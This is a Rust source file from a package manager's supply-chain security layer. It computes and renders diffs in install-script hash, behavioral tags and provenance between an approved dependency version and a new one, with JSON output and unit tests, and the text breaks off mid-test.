//! **Phase 46 P7 — pure version-diff core.**
//!
//! Computes the field-by-field diff between a prior-approved
//! [`TrustedDependencyBinding`] and a candidate [`BlockedPackage`]
//! across the three dimensions [§11 P7] calls out: script hash,
//! behavioral-tag set, and provenance identity tuple.
//!
//! ## Shape
//!
//! Pure functions over [`TrustedDependencyBinding`] and
//! [`BlockedPackage`]. No I/O, no registry calls, no stdout writes.
//! The [`VersionDiff`] + [`VersionDiffReason`] types mirror P6's
//! `TrustReason` split — decision is lifted out of the rendering
//! layer so unit tests can assert the classification without
//! capturing stdout, and the JSON output path (C4) can serialize
//! the same structure agents consume.
//!
//! ## Drift dimensions
//!
//! 1. **Script hash.** `TrustedDependencyBinding.script_hash` ==
//!    `BlockedPackage.script_hash`. Unknown on either side (`None`)
//!    is treated as "no signal" — the install-time binding may have
//!    been approved before the field was captured.
//! 2. **Behavioral tags.** `TrustedDependencyBinding.behavioral_tags_hash`
//!    compared fast; if the hashes differ, `.behavioral_tags` is
//!    compared as a set to produce the `gained / lost` delta the
//!    rendering layer surfaces (§11 P7 ship criterion 2).
//! 3. **Provenance identity.** Uses the SAME identity tuple
//!    (`present + publisher + workflow_path`) as
//!    `lpm_security::provenance::check_provenance_drift`, so the
//!    diff UI cannot disagree with the install-time drift gate on
//!    which dimension rotated.
//!
//! ## Prior-binding lookup
//!
//! This module DOES NOT resolve the prior version — callers pass the
//! `(prior_version, binding)` tuple obtained from
//! [`TrustedDependencies::latest_binding_for_name`]. The selector
//! discipline lives in `lpm-workspace` so P4's drift gate and P7's
//! diff can never select a different "prior approval."
//!
//! [`TrustedDependencyBinding`]: lpm_workspace::TrustedDependencyBinding
//! [`BlockedPackage`]: crate::build_state::BlockedPackage
//! [`TrustedDependencies::latest_binding_for_name`]: lpm_workspace::TrustedDependencies::latest_binding_for_name
//! [§11 P7]: https://github.com/anthropics/claude-code — see plan-doc §11 P7

use crate::build_state::BlockedPackage;
use lpm_workspace::{ProvenanceSnapshot, TrustedDependencyBinding};

/// The per-dimension classification of a version diff.
///
/// Multi-field drift collapses into [`Self::MultiFieldDrift`] rather
/// than enumerating every subset, because the rendering layer (C2 +
/// C3) and the JSON output (C4) surface each present dimension
/// independently — the enum is the routing decision, not the
/// per-dimension flag.
///
/// Ordering principle: more-surprising reasons sort later so a
/// future `worse_of`-style reduction can be added without a breaking
/// re-shuffle. Today only [`Self::NoChange`] is the terminal "don't
/// render" verdict; all others render.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum VersionDiffReason {
    /// None of the three dimensions drifted (or every one that did
    /// was `None`-vs-`None` = no signal). The rendering layer omits
    /// the diff card entirely. This is NOT the same as "fields are
    /// missing" — `NoChange` is a positive equality assertion on
    /// every dimension we can compare.
    NoChange,
    /// Only the script hash drifted between approved and candidate.
    /// Script bodies live in the store; the rendering layer reads
    /// them and produces a unified diff (that's a C2/C3 concern —
    /// this module only records the verdict).
    ScriptHashDrift,
    /// Only the behavioral-tag set drifted. `gained` / `lost` are
    /// the set-difference deltas, sorted lexicographically (matches
    /// `active_tag_names()` ordering) so output is deterministic.
    ///
    /// At least one of `gained` / `lost` is non-empty when this
    /// variant is returned — the `NoChange` case is filtered out
    /// upstream in [`compute_version_diff`].
    BehavioralTagShift {
        gained: Vec<String>,
        lost: Vec<String>,
    },
    /// Only the provenance identity tuple drifted. `kind`
    /// distinguishes the three meaningful cases — see
    /// [`ProvenanceDriftKind`].
    ProvenanceDrift { kind: ProvenanceDriftKind },
    /// Two or more dimensions drifted simultaneously. Each
    /// sub-verdict is present so the rendering layer can produce
    /// one card section per dimension without re-running the
    /// per-dimension check.
    MultiFieldDrift {
        script_hash: bool,
        tags: Option<TagShift>,
        provenance: Option<ProvenanceDriftKind>,
    },
}

/// Per-dimension behavioral-tag shift payload, shared between
/// [`VersionDiffReason::BehavioralTagShift`] and the multi-field
/// branch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TagShift {
    /// Tags present in the candidate but NOT in the prior-approved
    /// binding. Sorted lex.
    pub gained: Vec<String>,
    /// Tags present in the prior-approved binding but NOT in the
    /// candidate. Sorted lex.
    pub lost: Vec<String>,
}

/// How the provenance identity rotated.
///
/// Mirrors the `(approved, now)` match arms in
/// `lpm_security::provenance::check_provenance_drift` but EXPANDS
/// the `(None-side, Some-side)` cases so the rendering layer can
/// say "this version NEWLY has provenance" vs. "this version DROPPED
/// provenance" explicitly. The drift gate collapses
/// `Some(!present) + Some(present)` to `NoDrift` because present →
/// better; P7's UI still surfaces it as informational context.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProvenanceDriftKind {
    /// Approved side had provenance with identity `X`; candidate has
    /// provenance with identity `Y`. The identity tuple is
    /// `(present, publisher, workflow_path)` — `workflow_ref` and
    /// `attestation_cert_sha256` rotate per release and are excluded
    /// (same discipline as `identity_equal` in lpm-security).
    IdentityChanged,
    /// Approved side had provenance, candidate does NOT. The axios
    /// 1.14.1 pattern.
    Dropped,
    /// Approved side had no provenance attestation, candidate has
    /// one. The package "gained" provenance — informational only;
    /// `check_provenance_drift` treats this as `NoDrift`.
    Gained,
}

/// A computed version diff between a prior-approved binding and a
/// candidate `BlockedPackage`.
///
/// Callers typically:
/// 1. Look up the prior binding via
///    [`TrustedDependencies::latest_binding_for_name`].
/// 2. Pass `(prior_version, binding, candidate)` into
///    [`compute_version_diff`].
/// 3. Branch on `reason` to decide whether to render.
///
/// [`TrustedDependencies::latest_binding_for_name`]: lpm_workspace::TrustedDependencies::latest_binding_for_name
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VersionDiff {
    /// The version string of the prior-approved binding (e.g. `"1.14.0"`).
    /// Rendered in the human UI as `"since v1.14.0"`.
    pub prior_version: String,
    /// The candidate version string the diff is computed against.
    pub candidate_version: String,
    /// The classification. [`VersionDiffReason::NoChange`] means
    /// callers should suppress any diff rendering — no dimension
    /// drifted.
    pub reason: VersionDiffReason,
}

impl VersionDiff {
    /// Convenience predicate — `true` when at least one dimension
    /// actually drifted. Mirrors the `!matches!(reason, NoChange)`
    /// pattern so render-sites can read as `if diff.is_drift()`.
    pub fn is_drift(&self) -> bool {
        !matches!(self.reason, VersionDiffReason::NoChange)
    }
}

/// Identity tuple used for provenance comparison.
///
/// Mirrors `lpm_security::provenance::identity_equal` EXACTLY so the
/// diff UI's equality decision cannot diverge from the install-time
/// drift gate's equality decision. Keeping the comparison local (a
/// pure helper) rather than re-exporting the security crate's
/// private fn avoids a public-API leak from `lpm-security` just to
/// satisfy a rendering consumer.
fn provenance_identity_equal(a: &ProvenanceSnapshot, b: &ProvenanceSnapshot) -> bool {
    a.present == b.present && a.publisher == b.publisher && a.workflow_path == b.workflow_path
}

/// Classify a single provenance dimension given the `(approved,
/// candidate)` snapshots.
///
/// Returns `None` for the "no signal" cases where the diff UI should
/// stay silent:
/// - Neither side has a captured snapshot (both `None`).
/// - Approved has no snapshot but candidate does — this IS the
///   "Gained" case and returns `Some(Gained)`; the rendering layer
///   decides whether to surface it.
///
/// The full match table:
///
/// | approved     | candidate                        | verdict                                  |
/// |--------------|----------------------------------|------------------------------------------|
/// | `None`       | `None`                           | `None` (no signal)                       |
/// | `None`       | `Some(_ present = _)`            | `Some(Gained)` if present=true else `None` |
/// | `Some(_ present = true)` | `None`                | `Some(Dropped)`                          |
/// | `Some(_ present = true)` | `Some(_ present = false)` | `Some(Dropped)`                      |
/// | `Some(_ present = false)` | `Some(_ present = true)` | `Some(Gained)`                      |
/// | `Some(a)` | `Some(b)` (both present, identity eq)   | `None` (no change)                       |
/// | `Some(a)` | `Some(b)` (both present, identity neq)  | `Some(IdentityChanged)`                  |
/// | `Some(_ absent)` | `Some(_ absent)` / `None`            | `None` (no signal — never had it)        |
fn classify_provenance(
    approved: Option<&ProvenanceSnapshot>,
    candidate: Option<&ProvenanceSnapshot>,
) -> Option<ProvenanceDriftKind> {
    match (approved, candidate) {
        // Both absent → no signal.
        (None, None) => None,

        // Approved none, candidate something.
        (None, Some(c)) => {
            if c.present {
                Some(ProvenanceDriftKind::Gained)
            } else {
                // Candidate is `Some(present=false)` — the install
                // pipeline captured "no attestation" rather than
                // leaving the field empty. Equivalent to both-none
                // for the user; don't emit a drift card.
                None
            }
        }

        // Approved something, candidate none — the fetcher degraded
        // for the current install. Downgrade to no-signal per the
        // §7.2 "(Some, None) → OK" rule: we can't claim drift on a
        // transient fetch failure.
        (Some(_), None) => None,

        (Some(a), Some(c)) => match (a.present, c.present) {
            (false, false) => None, // neither version had provenance
            (false, true) => Some(ProvenanceDriftKind::Gained),
            (true, false) => Some(ProvenanceDriftKind::Dropped),
            (true, true) => {
                if provenance_identity_equal(a, c) {
                    None
                } else {
                    Some(ProvenanceDriftKind::IdentityChanged)
                }
            }
        },
    }
}

/// Classify the behavioral-tag shift given the `(approved,
/// candidate)` tag name sets.
///
/// Returns `None` when:
/// - Either side is `None` (missing signal — can't claim drift).
/// - Both sides are `Some` and the sets are equal (hash comparison
///   does the fast-path check upstream; this is the structural
///   fallback).
///
/// Returns `Some(TagShift)` with sorted `gained` / `lost` when at
/// least one tag differs. The input is assumed to already be sorted
/// (per `BehavioralTags::active_tag_names()`), which makes the
/// set-difference pass O(n+m) via a merge rather than requiring a
/// HashSet per call.
fn classify_tags(approved: Option<&[String]>, candidate: Option<&[String]>) -> Option<TagShift> {
    let (approved, candidate) = match (approved, candidate) {
        (Some(a), Some(c)) => (a, c),
        _ => return None,
    };

    // Both inputs are sorted-ascending (active_tag_names() guarantee);
    // walk both cursors and fall out on side-only entries.
    let mut gained: Vec<String> = Vec::new();
    let mut lost: Vec<String> = Vec::new();
    let mut i = 0usize;
    let mut j = 0usize;
    while i < approved.len() && j < candidate.len() {
        match approved[i].cmp(&candidate[j]) {
            std::cmp::Ordering::Equal => {
                i += 1;
                j += 1;
            }
            std::cmp::Ordering::Less => {
                // Present on approved-side only → lost.
                lost.push(approved[i].clone());
                i += 1;
            }
            std::cmp::Ordering::Greater => {
                // Present on candidate-side only → gained.
                gained.push(candidate[j].clone());
                j += 1;
            }
        }
    }
    // Drain whichever side has leftovers.
    while i < approved.len() {
        lost.push(approved[i].clone());
        i += 1;
    }
    while j < candidate.len() {
        gained.push(candidate[j].clone());
        j += 1;
    }

    if gained.is_empty() && lost.is_empty() {
        None
    } else {
        Some(TagShift { gained, lost })
    }
}

/// Classify the script-hash dimension.
///
/// Returns `true` iff both sides have a `Some(hash)` AND the hashes
/// differ. Missing-on-either-side is `false` (no signal).
fn classify_script_hash(approved: Option<&str>, candidate: Option<&str>) -> bool {
    match (approved, candidate) {
        (Some(a), Some(c)) => a != c,
        _ => false,
    }
}

/// Compute the version diff between a prior-approved binding and a
/// candidate `BlockedPackage`.
///
/// Pure: no I/O, no allocations beyond the returned structure. The
/// renderer (C2/C3) and the JSON emitter (C4) consume the returned
/// [`VersionDiff`] value.
///
/// Returns a [`VersionDiff`] with [`VersionDiffReason::NoChange`] when
/// every dimension is equal or contributes no signal. Callers can
/// branch on [`VersionDiff::is_drift`] to decide whether to render.
pub fn compute_version_diff(
    prior_version: &str,
    binding: &TrustedDependencyBinding,
    candidate: &BlockedPackage,
) -> VersionDiff {
    // Fast-path: if the binding's captured script_hash equals the
    // candidate's AND the behavioral_tags_hashes equal (or both are
    // None) AND the provenance tuples equal (or no signal), we can
    // short-circuit to NoChange without any allocation.
    //
    // Done via the per-dimension classifiers below, which each return
    // a "no signal / no change" sentinel; we aggregate after so the
    // diff-bearing cases produce the structured output.
    let script_drift = classify_script_hash(
        binding.script_hash.as_deref(),
        candidate.script_hash.as_deref(),
    );

    // Behavioral tags: compare hashes first for fast equality when
    // both sides have the hash. If either hash is None we fall back
    // to the name-set comparison directly — the hash is a
    // fingerprint optimization, not a semantic requirement.
    //
    // When hashes are both Some and equal, the sets are also equal
    // (the hash was computed FROM the names via `hash_behavioral_tag_set`
    // — same input, same output), so we can skip the merge-walk.
    let tags_equal_by_hash = matches!(
        (
            binding.behavioral_tags_hash.as_deref(),
            candidate.behavioral_tags_hash.as_deref(),
        ),
        (Some(a), Some(c)) if a == c
    );
    let tags_shift = if tags_equal_by_hash {
        None
    } else {
        classify_tags(
            binding.behavioral_tags.as_deref(),
            candidate.behavioral_tags.as_deref(),
        )
    };

    let provenance_drift = classify_provenance(
        binding.provenance_at_approval.as_ref(),
        candidate.provenance_at_capture.as_ref(),
    );

    let reason = match (script_drift, &tags_shift, &provenance_drift) {
        // No dimension drifted.
        (false, None, None) => VersionDiffReason::NoChange,
        // Single-dimension drifts.
        (true, None, None) => VersionDiffReason::ScriptHashDrift,
        (false, Some(shift), None) => VersionDiffReason::BehavioralTagShift {
            gained: shift.gained.clone(),
            lost: shift.lost.clone(),
        },
        (false, None, Some(kind)) => VersionDiffReason::ProvenanceDrift { kind: kind.clone() },
        // Multi-dimension drift — record each present dimension.
        _ => VersionDiffReason::MultiFieldDrift {
            script_hash: script_drift,
            tags: tags_shift,
            provenance: provenance_drift,
        },
    };

    VersionDiff {
        prior_version: prior_version.to_string(),
        candidate_version: candidate.version.clone(),
        reason,
    }
}

// ═══════════════════════════════════════════════════════════════════
//  Rendering layer
// ═══════════════════════════════════════════════════════════════════
//
// Pure text rendering — no I/O, no stdout writes. Callers (install.rs,
// approve_builds.rs) pass already-collected script-body snapshots and
// get back an `Option<String>` to emit however they route output
// (stderr vs stdout, `output::warn` vs `println!`, JSON vs human).
//
// Split into two entry points matching §11 P7's two render sites:
//   * [`render_terse_hint`]   — 1–2 line summary for the install
//     blocked-set warning. Omits unified diffs. Agents and humans
//     should both read this as "there's drift, run approve-builds
//     for details."
//   * [`render_preflight_card`] — fuller card for the autoBuild path
//     and the approve-builds TUI. Includes a unified script-body diff
//     via [`diffy`] when both store bodies are available; degrades
//     to a terse notice when the prior is absent from the store.

/// Snapshot of install-phase script bodies for one `name@version`.
///
/// Produced by reading the store with
/// [`crate::build_state::read_install_phase_bodies`] and converted to
/// a `HashMap<phase, body>` for lookup by [`render_preflight_card`].
/// Callers typically build this on the install path (where the store
/// is already open) and pass it in by reference so the renderer
/// stays pure.
pub type PhaseBodies = std::collections::BTreeMap<String, String>;

/// Ingest `Vec<(String, String)>` output from
/// [`crate::build_state::read_install_phase_bodies`] into a
/// `BTreeMap` keyed by phase name. `BTreeMap` (not `HashMap`) so
/// render output is deterministic across runs — callers that print
/// phase-by-phase should see the same order every time.
pub fn phase_bodies_from_pairs(pairs: Vec<(String, String)>) -> PhaseBodies {
    pairs.into_iter().collect()
}

/// Render a 1–2 line human-readable hint describing `diff`.
///
/// Returns `None` when [`VersionDiff::is_drift`] is false — callers
/// can `if let Some(line) = ...` without a sentinel check.
///
/// Format is TERSE: the diff card full content lives in
/// [`render_preflight_card`]; this function is what the post-install
/// banner appends per-package so the user gets "there's drift on
/// these N packages" visibility before entering `lpm approve-builds`.
///
/// Examples (leading two-space indent matches the existing
/// [`crate::commands::approve_builds::print_package_card`] layout so
/// the rendered hint composes cleanly with the broader warning
/// block):
///
/// ```text
///   esbuild@0.25.2 — script content changed since v0.25.1
///   axios@1.14.1  — provenance dropped since v1.14.0 (axios-pattern signal)
///   pkg@2.0.0     — behavioral tags +network, +eval since v1.0.0
///   pkg@2.0.0     — script + tags changed since v1.0.0 (see approve-builds)
/// ```
pub fn render_terse_hint(diff: &VersionDiff, package_name: &str) -> Option<String> {
    if !diff.is_drift() {
        return None;
    }
    let head = format!("  {}@{} — ", package_name, diff.candidate_version);
    let since = format!(" since v{}", diff.prior_version);
    let body = match &diff.reason {
        VersionDiffReason::NoChange => return None,
        VersionDiffReason::ScriptHashDrift => format!("script content changed{since}"),
        VersionDiffReason::BehavioralTagShift { gained, lost } => {
            format!("behavioral tags {}{since}", tag_delta_suffix(gained, lost))
        }
        VersionDiffReason::ProvenanceDrift { kind } => render_provenance_terse(kind, &since),
        VersionDiffReason::MultiFieldDrift {
            script_hash,
            tags,
            provenance,
        } => {
            let mut dims: Vec<&'static str> = Vec::new();
            if *script_hash {
                dims.push("script");
            }
            if tags.is_some() {
                dims.push("tags");
            }
            if provenance.is_some() {
                dims.push("provenance");
            }
            format!("{} changed{since}", dims.join(" + "))
        }
    };
    Some(format!("{head}{body}"))
}

fn render_provenance_terse(kind: &ProvenanceDriftKind, since: &str) -> String {
    match kind {
        ProvenanceDriftKind::IdentityChanged => {
            format!("provenance identity changed{since}")
        }
        ProvenanceDriftKind::Dropped => {
            format!("provenance dropped{since} (axios-pattern signal)")
        }
        ProvenanceDriftKind::Gained => format!("provenance gained{since}"),
    }
}

fn tag_delta_suffix(gained: &[String], lost: &[String]) -> String {
    let mut parts: Vec<String> = Vec::new();
    for t in gained {
        parts.push(format!("+{t}"));
    }
    for t in lost {
        parts.push(format!("-{t}"));
    }
    if parts.is_empty() {
        // The diff core guarantees at least one delta when it returns
        // `BehavioralTagShift`; `Vec::new()` here would be a bug
        // upstream, not a valid render. Fall back to a neutral label
        // rather than panicking in a display path.
        "changed".into()
    } else {
        parts.join(", ")
    }
}

/// Render a multi-line "changes since v<prior>" card — the fuller
/// view used by (a) the install auto-build preflight (before any
/// green's scripts execute) and (b) the approve-builds TUI (C3).
///
/// Returns `None` when [`VersionDiff::is_drift`] is false.
///
/// Inputs:
/// - `diff` — the classified diff value.
/// - `package_name` — rendered in the header.
/// - `prior_scripts` — `Some` iff the prior version is still in the
///   store. When `None`, the renderer degrades the script-body
///   section to a terse "(prior not in store)" note rather than
///   producing a spurious diff. The behavioral-tag and provenance
///   sections are unaffected by store availability.
/// - `candidate_scripts` — same shape for the candidate.
///
/// The script-body section uses [`diffy`]'s `Patch` + `PatchFormatter`
/// to produce a GNU-patch-style unified diff, the same format the
/// `lpm patch` infrastructure produces. Per-phase cards are emitted
/// in `EXECUTED_INSTALL_PHASES` order (preinstall → install →
/// postinstall) so output is deterministic.
pub fn render_preflight_card(
    diff: &VersionDiff,
    package_name: &str,
    prior_scripts: Option<&PhaseBodies>,
    candidate_scripts: Option<&PhaseBodies>,
) -> Option<String> {
    if !diff.is_drift() {
        return None;
    }

    let mut out = String::new();
    out.push_str(&format!(
        "  {}@{} — changes since v{}:\n",
        package_name, diff.candidate_version, diff.prior_version
    ));

    // Helper closures over the three dimension renderings so the
    // single-variant and multi-variant branches share one code path.
    let render_script = |out: &mut String, label: bool| {
        if label {
            out.push_str("    Script content changed:\n");
        }
        let body = render_script_body_diff(prior_scripts, candidate_scripts);
        // Indent the diff two extra spaces so it nests inside the card.
        for line in body.lines() {
            out.push_str("      ");
            out.push_str(line);
            out.push('\n');
        }
    };

    let render_tags = |out: &mut String, shift: &TagShift| {
        out.push_str("    Behavioral tags:\n");
        for t in &shift.gained {
            out.push_str(&format!("      + {t}\n"));
        }
        for t in &shift.lost {
            out.push_str(&format!("      - {t}\n"));
        }
    };

    let render_prov = |out: &mut String, kind: &ProvenanceDriftKind| {
        let line = match kind {
            ProvenanceDriftKind::IdentityChanged => "    Provenance identity changed.",
            ProvenanceDriftKind::Dropped => {
                "    Provenance dropped — previously-signed publisher, this version unsigned (axios-pattern signal)."
            }
            ProvenanceDriftKind::Gained => "    Provenance gained — this version is newly signed.",
        };
        out.push_str(line);
        out.push('\n');
    };

    match &diff.reason {
        VersionDiffReason::NoChange => return None,
        VersionDiffReason::ScriptHashDrift => render_script(&mut out, false),
        VersionDiffReason::BehavioralTagShift { gained, lost } => {
            let shift = TagShift {
                gained: gained.clone(),
                lost: lost.clone(),
            };
            render_tags(&mut out, &shift);
        }
        VersionDiffReason::ProvenanceDrift { kind } => render_prov(&mut out, kind),
        VersionDiffReason::MultiFieldDrift {
            script_hash,
            tags,
            provenance,
        } => {
            if *script_hash {
                render_script(&mut out, true);
            }
            if let Some(shift) = tags {
                render_tags(&mut out, shift);
            }
            if let Some(kind) = provenance {
                render_prov(&mut out, kind);
            }
        }
    }

    Some(out.trim_end().to_string())
}

/// Render the script-body diff section of a preflight card.
///
/// If either side is `None` (prior or candidate not readable from the
/// store), degrades to a one-line "(prior/candidate not in store —
/// unified diff unavailable; script hash differs)" note. Store
/// absence is the common degradation, not a bug: `lpm cache clean`
/// or a fresh clone can evict the prior version.
///
/// When both sides are present, iterates
/// [`lpm_security::EXECUTED_INSTALL_PHASES`] and emits a per-phase
/// unified diff header + body via [`diffy`]. Only phases that
/// differ between the two sides are emitted so a change in only
/// `postinstall` doesn't also dump `install` and `preinstall` as
/// no-op diffs.
fn render_script_body_diff(prior: Option<&PhaseBodies>, candidate: Option<&PhaseBodies>) -> String {
    let (prior, candidate) = match (prior, candidate) {
        (Some(p), Some(c)) => (p, c),
        _ => {
            return "(prior or candidate scripts not in store — unified diff \
                unavailable; script hash differs)"
                .into();
        }
    };

    let formatter = diffy::PatchFormatter::new();
    let mut out = String::new();
    for phase in lpm_security::EXECUTED_INSTALL_PHASES {
        let p = prior.get(*phase).map(String::as_str).unwrap_or("");
        let c = candidate.get(*phase).map(String::as_str).unwrap_or("");
        if p == c {
            continue;
        }

        // Ensure both sides end with a trailing newline so diffy's
        // line-by-line patch format doesn't attribute a "\ No
        // newline at end of file" marker to a phase that just has a
        // single shell command without a trailing \n.
        let p_norm = ensure_trailing_newline(p);
        let c_norm = ensure_trailing_newline(c);

        out.push_str(&format!("--- scripts.{phase} (v<prior>)\n"));
        out.push_str(&format!("+++ scripts.{phase} (v<candidate>)\n"));
        let patch = diffy::create_patch(&p_norm, &c_norm);
        out.push_str(&formatter.fmt_patch(&patch).to_string());
        out.push('\n');
    }
    if out.is_empty() {
        // All phases equal — shouldn't happen when reason ==
        // ScriptHashDrift, but degrade gracefully rather than emit
        // an empty card.
        "(script hash differs but per-phase bodies compare equal — possible \
         key-ordering drift in package.json; run `lpm build` for verbose \
         output)"
            .into()
    } else {
        out.trim_end().to_string()
    }
}

fn ensure_trailing_newline(s: &str) -> String {
    if s.ends_with('\n') {
        s.to_string()
    } else {
        let mut out = String::with_capacity(s.len() + 1);
        out.push_str(s);
        out.push('\n');
        out
    }
}

// ═══════════════════════════════════════════════════════════════════
//  JSON serialization (Phase 46 P7 Chunk 4)
// ═══════════════════════════════════════════════════════════════════
//
// Shared wire shape consumed by `lpm approve-builds --json`,
// `lpm approve-builds --list --json`, `lpm approve-builds --yes --json`,
// `lpm approve-builds <pkg> --json`, and the install pipeline's
// `--json` output. Centralizing here so the two CLI commands cannot
// drift in the JSON they emit per blocked entry.
//
// `SCHEMA_VERSION` (defined in `commands::approve_builds`) bumps
// 2 → 3 with the addition of the `version_diff` field per entry.
// Pre-v3 readers will see the new field as unknown and (per their
// JSON-tolerance discipline) ignore it; post-v3 readers branch on
// `schema_version >= 3` to know when to expect it.

/// Wire-form string for [`VersionDiffReason`]. Kebab-case to match
/// the [`StaticTier`] convention agents already parse.
pub fn version_diff_reason_wire(reason: &VersionDiffReason) -> &'static str {
    match reason {
        VersionDiffReason::NoChange => "no-change",
        VersionDiffReason::ScriptHashDrift => "script-hash-drift",
        VersionDiffReason::BehavioralTagShift { .. } => "behavioral-tag-shift",
        VersionDiffReason::ProvenanceDrift { .. } => "provenance-drift",
        VersionDiffReason::MultiFieldDrift { .. } => "multi-field-drift",
    }
}

/// Wire-form string for [`ProvenanceDriftKind`]. Kebab-case.
pub fn provenance_drift_kind_wire(kind: &ProvenanceDriftKind) -> &'static str {
    match kind {
        ProvenanceDriftKind::IdentityChanged => "identity-changed",
        ProvenanceDriftKind::Dropped => "dropped",
        ProvenanceDriftKind::Gained => "gained",
    }
}

/// Serialize a [`VersionDiff`] to its stable JSON wire shape.
///
/// **Stable contract** — every variant emits the SAME keys with
/// `null` for dimensions that didn't drift. Agents read with
/// uniform key access; no need for conditional `if "key" in obj`
/// checks. Stable across schema_version 3 and onward.
///
/// Per-key semantics:
/// - `prior_version`, `candidate_version` — always strings.
/// - `reason` — always a kebab-case string from
///   [`version_diff_reason_wire`].
/// - `script_hash_drift` — always a bool. `false` for `NoChange` and
///   the non-`MultiFieldDrift` variants whose dimension is not
///   script-hash; `true` for `ScriptHashDrift` and for
///   `MultiFieldDrift { script_hash: true, .. }`.
/// - `behavioral_tags_added` / `behavioral_tags_removed` — `null`
///   when the tag dimension didn't drift; arrays (possibly empty
///   on one side) when it did.
/// - `provenance_drift_kind` — `null` when the provenance
///   dimension didn't drift; one of the
///   [`provenance_drift_kind_wire`] strings when it did.
pub fn version_diff_to_json(diff: &VersionDiff) -> serde_json::Value {
    let (script_hash_drift, tags_opt, prov_opt) = match &diff.reason {
        VersionDiffReason::NoChange => (false, None, None),
        VersionDiffReason::ScriptHashDrift => (true, None, None),
        VersionDiffReason::BehavioralTagShift { gained, lost } => {
            (false, Some((gained.clone(), lost.clone())), None)
        }
        VersionDiffReason::ProvenanceDrift { kind } => (false, None, Some(kind.clone())),
        VersionDiffReason::MultiFieldDrift {
            script_hash,
            tags,
            provenance,
        } => (
            *script_hash,
            tags.as_ref().map(|t| (t.gained.clone(), t.lost.clone())),
            provenance.clone(),
        ),
    };

    let (added, removed) = match tags_opt {
        Some((g, l)) => (
            serde_json::Value::Array(g.into_iter().map(serde_json::Value::String).collect()),
            serde_json::Value::Array(l.into_iter().map(serde_json::Value::String).collect()),
        ),
        None => (serde_json::Value::Null, serde_json::Value::Null),
    };
    let prov_value = match prov_opt {
        Some(k) => serde_json::Value::String(provenance_drift_kind_wire(&k).to_string()),
        None => serde_json::Value::Null,
    };

    serde_json::json!({
        "prior_version": diff.prior_version,
        "candidate_version": diff.candidate_version,
        "reason": version_diff_reason_wire(&diff.reason),
        "script_hash_drift": script_hash_drift,
        "behavioral_tags_added": added,
        "behavioral_tags_removed": removed,
        "provenance_drift_kind": prov_value,
    })
}

/// Render a [`BlockedPackage`] as the canonical per-entry JSON shape
/// shared by `lpm approve-builds --json` and the install pipeline's
/// `--json` output.
///
/// **Phase 46 P7 Chunk 4** consolidates what were previously two
/// inline `serde_json::json!{...}` literals (one in `approve_builds`,
/// two in `install.rs`) into a single source of truth. The added
/// `version_diff` field requires `&trusted` so the helper can call
/// [`crate::version_diff::compute_version_diff`] when a prior binding
/// exists for the same package name.
///
/// `version_diff` is `null` when no prior binding exists (first-time
/// review — nothing to compare against). When a prior binding exists,
/// it's the structured object from [`version_diff_to_json`] —
/// including `reason: "no-change"` for the case where the prior was
/// found but no dimension drifted (so agents can distinguish "we
/// looked and there's no change" from "no prior to compare").
pub fn blocked_to_json(
    blocked: &crate::build_state::BlockedPackage,
    trusted: &lpm_workspace::TrustedDependencies,
) -> serde_json::Value {
    let version_diff = match trusted.latest_binding_for_name(&blocked.name, &blocked.version) {
        None => serde_json::Value::Null,
        Some((prior_version, binding)) => {
            let diff = compute_version_diff(prior_version, binding, blocked);
            version_diff_to_json(&diff)
        }
    };
    serde_json::json!({
        "name": blocked.name,
        "version": blocked.version,
        "integrity": blocked.integrity,
        "script_hash": blocked.script_hash,
        "phases_present": blocked.phases_present,
        "binding_drift": blocked.binding_drift,
        "static_tier": blocked.static_tier,
        "version_diff": version_diff,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::build_state::BlockedPackage;
    use lpm_workspace::{ProvenanceSnapshot, TrustedDependencyBinding};

    // ─── Fixtures ─────────────────────────────────────────────────

    fn candidate(name: &str, version: &str) -> BlockedPackage {
        BlockedPackage {
            name: name.into(),
            version: version.into(),
            integrity: Some(format!("sha512-{name}-{version}")),
            script_hash: Some(format!("sha256-{name}-{version}")),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }
    }

    fn snapshot(publisher: &str, workflow_path: &str) -> ProvenanceSnapshot {
        ProvenanceSnapshot {
            present: true,
            publisher: Some(publisher.into()),
            workflow_path: Some(workflow_path.into()),
            workflow_ref: Some("refs/tags/vX.Y.Z".into()),
            attestation_cert_sha256: Some("sha256-leaf".into()),
        }
    }

    fn snapshot_absent() -> ProvenanceSnapshot {
        ProvenanceSnapshot {
            present: false,
            ..Default::default()
        }
    }

    // ─── compute_version_diff — primary variants ──────────────────

    #[test]
    fn no_change_when_all_dimensions_equal() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            behavioral_tags_hash: Some("sha256-tags-same".into()),
            behavioral_tags: Some(vec!["network".into()]),
            provenance_at_approval: Some(snapshot(
                "github:axios/axios",
                ".github/workflows/publish.yml",
            )),
            ..Default::default()
        };
        let mut cand = candidate("axios", "1.14.1");
        cand.script_hash = Some("sha256-same".into());
        cand.behavioral_tags_hash = Some("sha256-tags-same".into());
        cand.behavioral_tags = Some(vec!["network".into()]);
        // Candidate has a DIFFERENT workflow_ref and cert — those are
        // excluded from identity equality, so this is still NoChange.
        let mut cand_prov = snapshot("github:axios/axios", ".github/workflows/publish.yml");
        cand_prov.workflow_ref = Some("refs/tags/v1.14.1".into());
        cand_prov.attestation_cert_sha256 = Some("sha256-leaf-bbb".into());
        cand.provenance_at_capture = Some(cand_prov);

        let diff = compute_version_diff("1.14.0", &binding, &cand);
        assert_eq!(diff.reason, VersionDiffReason::NoChange);
        assert!(!diff.is_drift());
        assert_eq!(diff.prior_version, "1.14.0");
        assert_eq!(diff.candidate_version, "1.14.1");
    }

    #[test]
    fn script_hash_drift_alone() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-old".into()),
            ..Default::default()
        };
        let mut cand = candidate("esbuild", "0.25.2");
        cand.script_hash = Some("sha256-new".into());

        let diff = compute_version_diff("0.25.1", &binding, &cand);
        assert_eq!(diff.reason, VersionDiffReason::ScriptHashDrift);
        assert!(diff.is_drift());
    }

    #[test]
    fn behavioral_tag_shift_gained_tags_surface() {
        // Ship criterion 2: "Updating a package whose behavioral tags
        // gained `network` or `eval` surfaces the delta."
